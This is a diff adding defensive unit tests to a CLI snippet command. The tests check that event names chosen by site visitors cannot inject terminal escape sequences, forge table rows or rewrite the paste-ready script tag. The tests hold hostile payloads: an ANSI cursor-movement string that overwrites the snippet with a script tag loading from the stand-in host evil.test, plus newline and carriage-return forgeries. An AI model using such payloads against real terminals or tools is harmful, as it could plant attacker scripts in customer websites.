@@ -590,6 +590,93 @@ describe('runSnippet', () => {
 
   // --- informational requests degrade instead of failing the command -----
 
+  describe('a hostile event name cannot drive the terminal or rewrite the snippet', () => {
+    // The Critical the whole-branch review found. `event_name` is not this
+    // CLI's text: it reaches the server through `/v1/track`, whose write
+    // key ships inside the browser bundle of every instrumented page, and
+    // whose validation bounds only LENGTH (`z.string().min(1).max(128)`,
+    // packages/core/src/ingest/payloads.ts) — no character class. So any
+    // visitor to the customer's site chooses these bytes.
+    //
+    // Each payload below is under 128 characters, i.e. actually sendable.
+    const CURSOR_ATTACK =
+      '\u001b[6A\u001b[2K<script async src="https://evil.test/l.js"></script>\u001b[6B'
+    const NEWLINE_FORGERY = 'zz_nl\n  wk_FORGED_KEY_LOOKS_REAL  999'
+    const CARRIAGE_RETURN = 'zz_cr\rwk_OVERWRITTEN'
+
+    function clientWithName(name: string): Client {
+      return fakeGetClient({
+        project: PROJECT,
+        schemaEvents: { events: [{ event_name: 'aaa_normal' }, { event_name: name }] },
+        stats: {
+          buckets: [
+            { bucket: '2026-08-02T00:00:00.000Z', event_name: 'aaa_normal', events: 7 },
+            { bucket: '2026-08-02T00:00:00.000Z', event_name: name, events: 999 },
+          ],
+        },
+      })
+    }
+
+    for (const [label, name] of [
+      ['an ESC-driven cursor attack', CURSOR_ATTACK],
+      ['a bare newline', NEWLINE_FORGERY],
+      ['a bare carriage return', CARRIAGE_RETURN],
+    ] as const) {
+      it(`keeps one row per event, with alignment intact, for ${label}`, async () => {
+        const { ctx, out } = makeCtx(clientWithName(name))
+        expect(await runSnippet([], ctx)).toBe(0)
+        const text = out.join('')
+
+        // 1. Nothing the terminal will OBEY. Not "this particular escape is
+        //    gone" — no control character at all survives into the table.
+        //    (The snippet above the table has real newlines, by design, so
+        //    this checks the table region only.)
+        const table = text.slice(text.indexOf('A zero count means'))
+        // biome-ignore lint/suspicious/noControlCharactersInRegex: asserting their absence is the point.
+        expect(table).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/)
+
+        // 2. One row per event, not three: a forged row is exactly what a
+        //    raw newline buys, and it is indistinguishable from a real one.
+        const rows = table.split('\n').filter((l) => l.startsWith('  '))
+        expect(rows).toHaveLength(2)
+
+        // 3. Alignment survives — the escaped form is what occupies
+        //    columns, so the count column still lines up. Measuring the RAW
+        //    name would put these two counts at different offsets.
+        const offsets = rows.map((r) => r.lastIndexOf('  '))
+        expect(offsets[0]).toBe(offsets[1])
+
+        // 4. And the snippet itself is untouched: the bundle-loading line
+        //    still names the real host, on its own line, whatever the event
+        //    name tried to overwrite it with. The forged URL may well
+        //    appear further down as INERT TEXT inside the escaped row —
+        //    that is the fix working, not failing — so this checks the
+        //    paste-ready block above the table, which is the region the
+        //    operator selects and the region the attack rewrote.
+        const block = text.slice(0, text.indexOf('Event counts'))
+        expect(block).toContain(`<script async src="${HOST}/lyraflow.js"></script>`)
+        expect(block).not.toContain('evil.test')
+      })
+    }
+
+    it('--json is safe by construction, and this checks it rather than assuming it', async () => {
+      // `JSON.stringify` escapes every control character inside a string it
+      // serialises — `\n` to two characters, ESC to the six characters
+      // `\`+`u001b`. Asserted here, not taken on trust, because the human
+      // path was ALSO assumed safe by inheritance from every other renderer
+      // in this CLI and was not.
+      const { ctx, out } = makeCtx(clientWithName(CURSOR_ATTACK))
+      await runSnippet(['--json'], ctx)
+      const text = out.join('')
+      // biome-ignore lint/suspicious/noControlCharactersInRegex: asserting their absence is the point.
+      expect(text.replace(/\n$/, '')).not.toMatch(/[\u0000-\u001f\u007f-\u009f]/)
+      const parsed = JSON.parse(text)
+      // The name round-trips EXACTLY — the JSON contract carries the real
+      // bytes, escaped; it is the terminal renderer that must not.
+      expect(parsed.events.counts).toContainEqual({ event_name: CURSOR_ATTACK, count: 999 })
+    })
+  })
+
   describe('schema/events and events/stats are informational', () => {
     it('still renders the snippet when schema/events fails', async () => {
       const client = fakeGetClient({
